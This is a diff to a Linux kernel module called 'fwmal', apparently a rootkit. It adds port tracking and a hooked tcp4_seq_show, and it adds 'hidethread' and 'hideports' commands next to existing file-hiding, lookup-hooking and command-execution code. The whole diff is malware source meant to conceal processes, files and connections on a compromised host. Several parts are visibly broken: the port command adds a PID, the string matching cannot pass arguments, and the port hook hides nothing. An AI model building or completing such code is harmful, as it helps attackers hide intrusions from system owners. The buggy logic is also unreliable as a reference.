@@ -6,7 +6,11 @@
 #include<linux/inet.h>
 #include<linux/socket.h>
 #include<net/sock.h>
+#include <linux/icmp.h>
 #include<linux/init.h>
+#include <linux/tcp.h>
+#include <net/inet_sock.h>
+#include <linux/ip.h>
 #include<linux/module.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
@@ -41,6 +45,31 @@ struct fwmal_procs{
 	long pid;
 	struct list_head list;
 };
+
+LIST_HEAD(ports);
+struct fwmal_ports{
+	unsigned short port;
+	struct list_head list;
+};
+
+int addport(unsigned short port){
+	struct fwmal_ports *fwmal_port = kmalloc(sizeof(struct fwmal_ports), GFP_KERNEL);
+	fwmal_port->port = port;
+	list_add_tail(&fwmal_port->list,&ports);
+	printk("[fwmal]: port is %hu",port);
+	return 0;
+}
+
+int deletport(unsigned short port){
+	struct list_head* ld;
+	list_for_each(ld,&ports){
+		if(container_of(ld,struct fwmal_ports,list)->port == port){
+			list_del(ld);
+			return 0;
+		}
+	}
+	return -1;
+}
 
 int addpid(long pid){
 	struct fwmal_procs *proc = kmalloc(sizeof(struct fwmal_procs), GFP_KERNEL);
@@ -247,6 +276,27 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 	return found;
 }
 
+KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
+static int khook_tcp4_seq_show(struct seq_file *seq, void *v){
+	int ret;
+	struct sock *sk = v;
+	struct inet_sock *inet;
+	unsigned short dport;
+	//unsigned int daddr;
+	struct list_head* ld;
+
+	inet = (struct inet_sock *)sk;
+	dport = inet->inet_dport;
+	//daddr = inet->inet_daddr;
+	list_for_each(ld,&ports){
+		if(container_of(ld,struct fwmal_ports,list)->port == dport)
+			printk("[fwmal]:iii%hd",dport);
+	}
+	
+	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
+	return ret;
+}
+
 
 /*
 #include <linux/fs.h> // has inode_permission() proto
@@ -349,6 +399,13 @@ int parse(char* buf){
 		return call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_EXEC); //call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
 	}else if(strcmp(buf,"hidefile")==0){
 		printk("[fwmal]:hidefile");
+		addfile(buf+9);
+	}else if(strcmp(buf,"hidethread") ==0){
+		printk("[fwmal]:hidethread");	
+		addpid(simple_strtoull(buf+11,NULL,0));
+	}else if(strcmp(buf,"hideports") ==0){
+		printk("[fwmal]:hidethread");	
+		addpid((unsigned short)simple_strtoull(buf+11,NULL,0));
 	}
 	
 	return 0;
@@ -428,7 +485,8 @@ static int __init fwmal_init(void)
 	//init_nf();
 	//ret = parse("hidefile");
 	//addfile("fwmaltest\0qweqe");
-	addpid(1);
+	//addpid(1);
+	//addport(47006);
 
 	if (ret != 0)
 		goto out;
